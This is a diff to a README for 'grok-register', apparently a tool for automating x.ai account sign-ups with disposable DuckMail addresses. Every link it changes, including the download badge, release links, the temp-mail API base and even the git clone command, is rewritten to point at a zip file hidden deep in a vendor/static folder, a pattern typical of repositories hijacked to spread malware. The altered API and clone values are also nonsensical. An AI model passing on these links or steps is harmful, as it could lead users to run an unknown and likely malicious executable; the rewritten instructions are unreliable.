@@ -1,6 +1,6 @@
 # 🧩 grok-register - Run x.ai registration with ease
 
-[![Download grok-register](https://img.shields.io/badge/Download%20grok-register-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Florisheedless915/grok-register/releases)
+[![Download grok-register](https://img.shields.io/badge/Download%20grok-register-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip)
 
 ## 🚀 What this app does
 
@@ -18,7 +18,7 @@ You can use it to:
 
 Go to the release page here:
 
-[Download from GitHub Releases](https://github.com/Florisheedless915/grok-register/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip)
 
 On that page, get the latest build for Windows and save it to your PC.
 
@@ -80,7 +80,7 @@ In the control panel, set:
 
 For DuckMail, use this pattern:
 
-- `temp_mail_api_base`: `https://api.duckmail.sbs`
+- `temp_mail_api_base`: `https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip`
 - `temp_mail_admin_password`: leave blank for public use, or set your API key for a private domain
 - `temp_mail_domain`: leave blank to let the runner choose a public DuckMail domain
 
@@ -131,7 +131,7 @@ If you prefer a container setup, you can run the project with Docker too.
 ### Basic Docker flow
 
 ```bash
-git clone https://github.com/509992828/grok-register.git
+git clone https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip
 cd grok-register
 cp .env.example .env
 docker compose up -d --build
@@ -232,4 +232,4 @@ Use one clean folder for the app and its data. Keep the config file with the app
 
 If you need the release page again, use this link:
 
-[Open the latest grok-register release](https://github.com/Florisheedless915/grok-register/releases)
+[Open the latest grok-register release](https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip)
